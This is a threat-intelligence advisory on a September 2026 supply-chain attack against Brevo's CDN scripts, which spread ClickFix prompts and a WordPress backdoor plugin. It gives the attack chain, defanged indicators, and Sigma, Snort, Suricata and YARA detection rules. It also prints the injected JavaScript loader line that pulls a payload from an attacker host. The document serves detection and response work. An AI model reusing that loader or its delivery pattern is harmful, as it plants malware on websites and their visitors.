# Brevo Supply-Chain Attack: ClickFix Injection via Compromised Cloudflare API Key

**Date:** 2026-09-20
**Status:** FINAL
**TLP:** CLEAR
**Author:** Actioner

---

## Executive Summary

On September 14, 2026, attackers exploited a compromised Cloudflare API key belonging to Brevo (formerly Sendinblue) to deploy a malicious Cloudflare Worker that injected ClickFix social-engineering scripts into Brevo's own websites and three JavaScript files embedded across over 100,000 customer websites. The attack was active for approximately 5.5 hours (16:05-20:13 UTC). Visitors were shown fake Cloudflare "verify you are human" prompts instructing them to execute clipboard-injected commands via Win+R. On WordPress sites, the attack additionally attempted to install a persistent backdoor plugin called "Web Media Optimizer." The root cause was a long-lived Cloudflare API key with full account permissions that had been hardcoded in application source code.

---

## Background

Brevo is a French cloud-based marketing and customer communication platform used by major brands including eBay, Louis Vuitton, and Michelin. Brevo provides embeddable JavaScript widgets for forms, conversations, and SDK functionality that customers include on their websites.

The attack chain began with an initial compromise on September 10 through a vulnerability in Brevo's SAML SSO system, which gave attackers access to 138 accounts (including cryptocurrency hardware wallet maker Trezor). When Brevo blocked that access, the attackers returned on September 14 using the separately obtained Cloudflare API key. Attacker infrastructure preparation began as early as August 25, 2026, when a certificate was created for cdn[.]sendibt1[.]com.

---

## Technical Analysis

### Attack Chain

1. **Initial Access (T1195.002):** Attackers obtained a long-lived Cloudflare API key with full account permissions that was hardcoded in Brevo's application source code.

2. **Infrastructure Setup (Aug 25 - Sep 14):** Attackers created DNS records and TLS certificates for malicious subdomains under `sendibt1[.]com`, a legitimate Brevo tracking domain. Multiple CDN-prefixed subdomains were created (cdn, cdn2, cdn3, cdn4, cdn9, cdn10, cdn11).

3. **Execution (Sep 14, 16:05-20:13 UTC):** A malicious Cloudflare Worker was deployed that:
   - Modified CDN-served responses at the edge
   - Removed Content-Security-Policy headers from responses
   - Injected malicious JavaScript loader code into three customer-facing scripts:
     - `https://cdn[.]brevo[.]com/js/sdk-loader.js`
     - `https://cdn[.]brevo[.]com/js/brevo-conversations.js`
     - `https://conversations-widget[.]brevo[.]com/brevo-conversations.js`

4. **ClickFix Social Engineering (T1204.001):** The injected code loaded `f.js` from attacker-controlled subdomains, which:
   - Performed visitor fingerprinting via C2 API endpoints
   - Obtained proof-of-work tokens for anti-analysis
   - Displayed a full-screen fake Cloudflare verification page
   - Instructed visitors to press Win+R, Ctrl+V, then Enter -- executing a clipboard-injected command

5. **WordPress Backdoor (T1505.003):** On WordPress sites with Brevo widgets, the script:
   - Checked if the visitor was logged in as a WordPress administrator
   - Silently downloaded `wm.zip` from `cdn10[.]sendibt1[.]com/p/wm.zip`
   - Installed it via `/wp-admin/update.php?action=upload-plugin`
   - Activated the "Web Media Optimizer" plugin
   - The plugin hid itself from the WordPress plugin list
   - Copied itself to the `mu-plugins` directory for persistence
   - Established periodic C2 communication with `glegchner[.]com/ads.php`
   - Contained a hardcoded authentication mechanism to generate admin sessions without passwords

### Evasion Techniques

- Targeted only logged-in WordPress admins
- Ignored crawlers, developers, and security scanners
- Used legitimate Brevo infrastructure (sendibt1[.]com) for malware hosting
- CSP headers were stripped by the Cloudflare Worker to prevent policy violations

---

## Indicators of Compromise (IOCs)

All network indicators are defanged.

### Malicious Domains

| Domain | Purpose |
|--------|---------|
| sendibt1[.]com | Brevo-owned domain abused for malware hosting |
| cdn[.]sendibt1[.]com | Malicious script/content delivery |
| cdn2[.]sendibt1[.]com | Malicious f.js loader |
| cdn3[.]sendibt1[.]com | Malicious infrastructure |
| cdn4[.]sendibt1[.]com | Malicious infrastructure |
| cdn9[.]sendibt1[.]com | Malicious f.js loader (IP: 188[.]114[.]97[.]3) |
| cdn10[.]sendibt1[.]com | WordPress backdoor distribution |
| cdn11[.]sendibt1[.]com | Malicious f.js loader |
| glegchner[.]com | C2 server for WordPress backdoor |
| corralos[.]beer | ClickFix lure JavaScript delivery |
| yelahaye[.]surf | Malware/plugin distribution |
| boiseno[.]club | Malware/plugin distribution |

### IP Addresses

| IP | Association |
|----|-------------|
| 104[.]21[.]77[.]104 | cdn[.]sendibt1[.]com |
| 188[.]114[.]97[.]3 | cdn9[.]sendibt1[.]com |

### Malicious URLs

| URL | Purpose |
|-----|---------|
| hxxps://cdn2[.]sendibt1[.]com/f.js | Primary malware loader |
| hxxps://cdn9[.]sendibt1[.]com/f.js | Malware loader variant |
| hxxps://cdn11[.]sendibt1[.]com/f.js | Malware loader variant |
| hxxps://cdn[.]sendibt1[.]com/f.js | Malware loader variant |
| hxxps://cdn10[.]sendibt1[.]com/p/wm.zip | WordPress backdoor plugin archive |
| hxxps://glegchner[.]com/ads.php | C2 callback endpoint |
| hxxps://corralos[.]beer/a412dkoq.js | ClickFix lure JavaScript |

### C2 API Endpoints (on sendibt1[.]com subdomains)

| Path | Purpose |
|------|---------|
| /f.js | Primary loader |
| /api/v1/0044d4a | Fingerprinting |
| /api/v1/e08a3c4 | Proof-of-work token |
| /api/v1/8e4c615 | Fingerprinting variant |
| /api/v1/f659473 | Proof-of-work token variant |
| /api/v1/4aff112?tk= | Clipboard command delivery |
| /api/v1/b832c14?e= | Event beacons |
| /api/v1/4ead0ff?tk= | Image beacon |
| /image.php?tk= | Image beacon |

### File Hashes (SHA-256)

| Hash | Description |
|------|-------------|
| f359ab0d2f732b54dd3300065f4d6553f4df1b67454b71fd81197e26f02af4a8 | "Web Media Optimizer" WordPress backdoor plugin |
| 58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308 | Injected sdk-loader.js variant 1 |
| f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782 | Injected sdk-loader.js variant 2 |
| 9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5 | Injected brevo-conversations.js |
| 4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7 | Cloaking/evasion response |

### Compromised Brevo Assets

| URL | Type |
|-----|------|
| hxxps://cdn[.]brevo[.]com/js/sdk-loader.js | Modified SDK loader |
| hxxps://cdn[.]brevo[.]com/js/brevo-conversations.js | Modified conversations widget |
| hxxps://conversations-widget[.]brevo[.]com/brevo-conversations.js | Modified conversations widget |

### Affected Brevo Domains

- brevo[.]com
- sendinblue[.]com
- login[.]brevo[.]com / account[.]brevo[.]com / my[.]brevo[.]com / onboarding[.]brevo[.]com
- sibforms[.]com

### JavaScript Injection Pattern

```javascript
(function(){var s=document.createElement("script");s.src="hxxps://cdn2[.]sendibt1[.]com/f.js";
s.async=true;var h=document.head||document.documentElement;h.appendChild(s)})();
```

### WordPress Attack Indicators

- HTTP POST to `/wp-admin/update.php?action=upload-plugin` from non-admin sources
- HTTP GET to `/wp-admin/plugins.php?action=activate` shortly after suspicious upload
- Plugin name: "Web Media Optimizer"
- Plugin self-copies to `mu-plugins` directory
- C2 callback to `glegchner[.]com/ads.php`

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|----|-------------|
| Compromise Software Supply Chain | T1195.002 | Attacker compromised Brevo's Cloudflare account to modify CDN-served JavaScript files embedded across 100k+ customer sites |
| JavaScript / Command and Scripting Interpreter | T1059.007 | Malicious JavaScript injected into legitimate Brevo scripts to load attacker-controlled code |
| User Execution: Malicious Link | T1204.001 | ClickFix social engineering prompted users to execute clipboard-injected commands |
| Application Layer Protocol: Web Protocols | T1071.001 | C2 communication via HTTPS API endpoints on sendibt1[.]com subdomains |
| Server Software Component: Web Shell | T1505.003 | WordPress backdoor plugin "Web Media Optimizer" installed as must-use plugin for persistence |
| Account Manipulation | T1098 | Hardcoded WordPress admin authentication key in backdoor plugin |
| Subvert Trust Controls | T1553 | Removal of Content-Security-Policy headers by malicious Cloudflare Worker |

---

## Detection & Remediation

### Immediate Actions

1. **Review web proxy/DNS logs** for connections to `sendibt1[.]com`, `glegchner[.]com`, `corralos[.]beer`, `yelahaye[.]surf`, and `boiseno[.]club` between August 25 and September 15, 2026.
2. **WordPress administrators** should check for the "Web Media Optimizer" plugin, inspect the `mu-plugins` directory for unauthorized entries, and compare the filesystem plugin list against the admin interface.
3. **Endpoint teams** should scan devices of users who visited affected websites during the attack window for malware delivered via the ClickFix prompt.
4. **Rotate credentials** for any WordPress admin accounts that may have been active on sites embedding Brevo widgets during the attack window.

### Preventive Measures

1. **Subresource Integrity (SRI):** Implement SRI hashes on all third-party JavaScript includes to detect modifications.
2. **Content Security Policy:** Deploy strict CSP headers and monitor violation reports (2,549 CSP violation reports were recorded across 12 monitored sites during the attack).
3. **API Key Management:** Never hardcode long-lived API keys with full account permissions in source code; use scoped, short-lived tokens and secrets management.
4. **Monitor for ClickFix patterns:** Alert on pages displaying "verify you are human" overlays combined with Win+R/Ctrl+V instruction patterns.

---

## Detection Rules

These detections target the Brevo supply-chain ClickFix campaign's network IOCs, malware delivery URLs, C2 API endpoints, and file-level artifacts. PoC/advisory-specific altitude; Sigma rules convert cleanly to Splunk and CrowdStrike (LogScale). The Sigma WordPress backdoor rule was dropped (see note below).

### Sigma: Brevo Supply Chain Attack - Malicious Domain Access

Detects HTTP proxy requests to attacker-created CDN subdomains (cdn, cdn2-4, cdn9-11) of sendibt1[.]com and associated C2 domains. Narrowed to CDN subdomains to avoid matching legitimate Brevo email-tracking traffic on bare sendibt1[.]com.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. Narrowed from bare sendibt1.com to cdn*.sendibt1.com subdomains per critic. Tags fixed: removed T1059.007+T1204.001, added T1071.001. -->
<!-- revision: narrowed sendibt1 to CDN subdomains; fixed ATT&CK tags; converted HTML comments to YAML. -->

```yaml
title: Brevo Supply Chain Attack - Malicious Domain Access
id: 7a3b1e4f-2c5d-4a8e-9f1b-6d3c7e8a9b0c
status: experimental
description: Detects HTTP requests to attacker-controlled CDN subdomains of sendibt1.com and associated C2 infrastructure used in the Brevo supply chain ClickFix attack of September 2026.
references:
    - https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026/09/20
tags:
    - attack.t1195.002
    - attack.t1071.001
logsource:
    category: proxy
detection:
    selection_sendibt1:
        c-uri|contains:
            - 'cdn.sendibt1.com'
            - 'cdn2.sendibt1.com'
            - 'cdn3.sendibt1.com'
            - 'cdn4.sendibt1.com'
            - 'cdn9.sendibt1.com'
            - 'cdn10.sendibt1.com'
            - 'cdn11.sendibt1.com'
    selection_c2:
        c-uri|contains:
            - 'glegchner.com'
            - 'corralos.beer'
            - 'yelahaye.surf'
            - 'boiseno.club'
    condition: selection_sendibt1 or selection_c2
falsepositives:
    - Unlikely - these CDN subdomains were created by the attacker
level: high
```

### Sigma: Brevo Supply Chain Attack - Malicious JavaScript Loader Pattern

Detects requests to the specific malicious f.js loader and wm.zip backdoor URLs on sendibt1[.]com CDN subdomains.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. Exact malware delivery paths from Sansec research; no FP risk. -->
<!-- revision: converted HTML comments to YAML. -->

```yaml
title: Brevo Supply Chain Attack - Malicious JavaScript Loader Pattern
id: 8b4c2f5a-3d6e-4b9f-a02c-7e4d8f9a1b2d
status: experimental
description: Detects web proxy logs showing requests for the malicious f.js loader script from sendibt1.com CDN subdomains used in the Brevo supply chain attack.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
author: Actioner
date: 2026/09/20
tags:
    - attack.t1195.002
    - attack.t1059.007
logsource:
    category: proxy
detection:
    selection:
        c-uri|contains:
            - 'cdn2.sendibt1.com/f.js'
            - 'cdn9.sendibt1.com/f.js'
            - 'cdn11.sendibt1.com/f.js'
            - 'cdn.sendibt1.com/f.js'
            - 'cdn10.sendibt1.com/p/wm.zip'
    condition: selection
falsepositives:
    - Unlikely
level: critical
```

### Sigma: Brevo Supply Chain Attack - C2 API Endpoint Access

Detects C2 API endpoint access patterns combining sendibt1[.]com domain with specific hex API paths used for fingerprinting and command delivery.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. Domain AND specific hex path segments = high precision. -->
<!-- revision: converted HTML comments to YAML. -->

```yaml
title: Brevo Supply Chain Attack - C2 API Endpoint Access
id: 9c5d3a6b-4e7f-4c0a-b13d-8f5e9a0b2c3e
status: experimental
description: Detects HTTP requests to C2 API endpoints used by the Brevo supply chain ClickFix malware for fingerprinting, proof-of-work tokens, and clipboard command delivery.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
author: Actioner
date: 2026/09/20
tags:
    - attack.t1195.002
    - attack.t1071.001
logsource:
    category: proxy
detection:
    selection_domain:
        c-uri|contains:
            - 'sendibt1.com'
    selection_api:
        c-uri|contains:
            - '/api/v1/0044d4a'
            - '/api/v1/e08a3c4'
            - '/api/v1/8e4c615'
            - '/api/v1/f659473'
            - '/api/v1/4aff112'
            - '/api/v1/b832c14'
            - '/api/v1/4ead0ff'
    condition: selection_domain and selection_api
falsepositives:
    - Unlikely
level: high
```

### Sigma: Brevo Supply Chain Attack - WordPress Plugin Upload Attempt (DROPPED)

**Dropped.** Logic error: the attack injects JS in the victim's browser; the HTTP Referer for the POST to `/wp-admin/update.php` would be the customer's own page URL, not brevo[.]com or sendibt1[.]com. Even if corrected, any legitimate WordPress plugin upload on a Brevo-integrated site would false-positive. WordPress backdoor detection is covered by the network IOC rules and the YARA WP backdoor rule instead.
<!-- revision: dropped per critic verdict — non-functional referer logic + high FP. -->

### Snort: Brevo Supply Chain - Network Domain Detection (7 rules)

Network-level detection for HTTP traffic to attacker-controlled domains and specific malware delivery paths. SIDs in local range (1000001-1000007); SID 1000001 requires both "cdn" and "sendibt1.com" in the header to avoid matching legitimate tracking.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -T exit 0. SIDs renumbered from 2100xxx to 1000xxx (local range) to avoid ET reserved range. SID 1000001 narrowed to require "cdn" prefix + "sendibt1.com" to avoid FP on legitimate tracking. -->
<!-- revision: renumbered SIDs to local range; narrowed sendibt1.com rule to CDN subdomains. -->

```snort
# Snort rules for Brevo Supply Chain Attack - Malicious Domain Detection
# References: https://sansec.io/research/brevo-supply-chain-attack
#             https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - sendibt1.com CDN subdomains"; flow:established,to_server; content:"cdn"; http_header; content:"sendibt1.com"; http_header; classtype:trojan-activity; sid:1000001; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - glegchner.com C2 domain"; flow:established,to_server; content:"glegchner.com"; http_header; classtype:trojan-activity; sid:1000002; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - corralos.beer ClickFix domain"; flow:established,to_server; content:"corralos.beer"; http_header; classtype:trojan-activity; sid:1000003; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - yelahaye.surf malware distribution"; flow:established,to_server; content:"yelahaye.surf"; http_header; classtype:trojan-activity; sid:1000004; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - boiseno.club malware distribution"; flow:established,to_server; content:"boiseno.club"; http_header; classtype:trojan-activity; sid:1000005; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - f.js malicious loader request"; flow:established,to_server; content:"sendibt1.com"; http_header; content:"/f.js"; http_uri; classtype:trojan-activity; sid:1000006; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - wm.zip backdoor plugin download"; flow:established,to_server; content:"sendibt1.com"; http_header; content:"/p/wm.zip"; http_uri; classtype:trojan-activity; sid:1000007; rev:1;)
```

### Suricata: Brevo Supply Chain - Domain and C2 Detection (9 rules)

Suricata rules with dot-notation buffers, `endswith` modifiers on all `http.host` matches to prevent partial-domain false positives, and specific hex C2 API path segments. SIDs in local range (1000101-1000109).
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. SIDs renumbered from 2200xxx to 1000xxx local range. Added endswith to all http.host content matches. Replaced generic /api/v1/ rule with specific hex path /api/v1/0044d4a. Added reference and metadata fields. -->
<!-- revision: renumbered SIDs; added endswith; strengthened C2 API rule with specific hex path. -->

```suricata
# Suricata rules for Brevo Supply Chain Attack - Malicious Domain Detection
# References: https://sansec.io/research/brevo-supply-chain-attack
#             https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - cdn.sendibt1.com malicious CDN"; flow:established,to_server; http.host; content:"cdn.sendibt1.com"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000101; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - glegchner.com C2 callback"; flow:established,to_server; http.host; content:"glegchner.com"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000102; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - corralos.beer ClickFix"; flow:established,to_server; http.host; content:"corralos.beer"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000103; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - yelahaye.surf malware dist"; flow:established,to_server; http.host; content:"yelahaye.surf"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000104; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - boiseno.club malware dist"; flow:established,to_server; http.host; content:"boiseno.club"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000105; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - f.js malicious loader"; flow:established,to_server; http.host; content:".sendibt1.com"; endswith; http.uri; content:"/f.js"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000106; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - wm.zip backdoor download"; flow:established,to_server; http.host; content:".sendibt1.com"; endswith; http.uri; content:"/p/wm.zip"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000107; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - C2 API hex endpoint"; flow:established,to_server; http.host; content:".sendibt1.com"; endswith; http.uri; content:"/api/v1/0044d4a"; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000108; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - glegchner.com ads.php C2"; flow:established,to_server; http.host; content:"glegchner.com"; endswith; http.uri; content:"/ads.php"; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000109; rev:1;)
```

### YARA: Brevo ClickFix JS Injection (3 rules)

File-level detection for the injected JavaScript loader pattern, the WordPress backdoor plugin, and C2 API communication patterns.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. 3 rules: (1) JS injection with sendibt1.com loader strings, (2) WP backdoor with plugin name + C2 domain combinational logic, (3) C2 API hex paths + domain AND logic. Renamed reference2 to reference (YARA allows repeated same-name meta). -->
<!-- revision: renamed reference2 meta key to reference. -->

```yara
rule Brevo_ClickFix_JS_Injection
{
    meta:
        description = "Detects the malicious JavaScript injection pattern used in the Brevo supply chain ClickFix attack"
        author = "Actioner"
        date = "2026-09-20"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        reference = "https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/"
        hash = "58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308"

    strings:
        $inject1 = "sendibt1.com/f.js" ascii wide
        $inject2 = "sendibt1.com" ascii wide
        $loader_pattern = "document.createElement(\"script\")" ascii
        $async_append = "h.appendChild(s)" ascii
        $domain_cdn2 = "cdn2.sendibt1.com" ascii wide
        $domain_cdn9 = "cdn9.sendibt1.com" ascii wide
        $domain_cdn11 = "cdn11.sendibt1.com" ascii wide
        $domain_cdn10 = "cdn10.sendibt1.com" ascii wide

    condition:
        ($inject1) or ($inject2 and $loader_pattern and $async_append) or (any of ($domain_cd*))
}

rule Brevo_ClickFix_WP_Backdoor
{
    meta:
        description = "Detects the Web Media Optimizer WordPress backdoor plugin from the Brevo supply chain attack"
        author = "Actioner"
        date = "2026-09-20"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        hash = "f359ab0d2f732b54dd3300065f4d6553f4df1b67454b71fd81197e26f02af4a8"

    strings:
        $plugin_name = "Web Media Optimizer" ascii wide
        $c2_domain = "glegchner.com" ascii wide
        $c2_path = "/ads.php" ascii wide
        $must_use = "mu-plugins" ascii wide
        $wp_upload = "upload-plugin" ascii wide

    condition:
        ($plugin_name and ($c2_domain or $must_use)) or ($c2_domain and $c2_path) or ($plugin_name and $wp_upload)
}

rule Brevo_ClickFix_C2_Communication
{
    meta:
        description = "Detects C2 API patterns used by the Brevo ClickFix malware for fingerprinting and command delivery"
        author = "Actioner"
        date = "2026-09-20"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"

    strings:
        $api1 = "/api/v1/0044d4a" ascii
        $api2 = "/api/v1/e08a3c4" ascii
        $api3 = "/api/v1/8e4c615" ascii
        $api4 = "/api/v1/f659473" ascii
        $api5 = "/api/v1/4aff112" ascii
        $api6 = "/api/v1/b832c14" ascii
        $api7 = "/api/v1/4ead0ff" ascii
        $domain = "sendibt1.com" ascii wide
        $clickfix_domain = "corralos.beer" ascii wide

    condition:
        (any of ($api*) and $domain) or ($clickfix_domain and any of ($api*))
}
```

---

## Sources

- [BleepingComputer - Brevo supply-chain attack injected ClickFix scripts on customer sites](https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/)
- [Sansec - Brevo supply chain attack hits 100k+ sites with WordPress backdoors and ClickFix malware](https://sansec.io/research/brevo-supply-chain-attack)
- [SecurityWeek - Brevo Supply Chain Attack Injects Malware Into 100,000 Websites](https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/)
- [SecurityAffairs - Brevo Supply-Chain Attack Infected Over 100,000 Websites](https://securityaffairs.com/199355/hacking/brevo-supply-chain-attack-infected-over-100000-websites.html)
- [CyberInsider - 100,000+ WordPress sites infected via Brevo supply chain attack](https://cyberinsider.com/100000-wordpress-sites-infected-via-brevo-supply-chain-attack/)
- [CyberPress - Attackers Abuse Brevo CDN and DNS to Inject Malicious JavaScript](https://cyberpress.org/brevo-cdn-javascript-injection/)
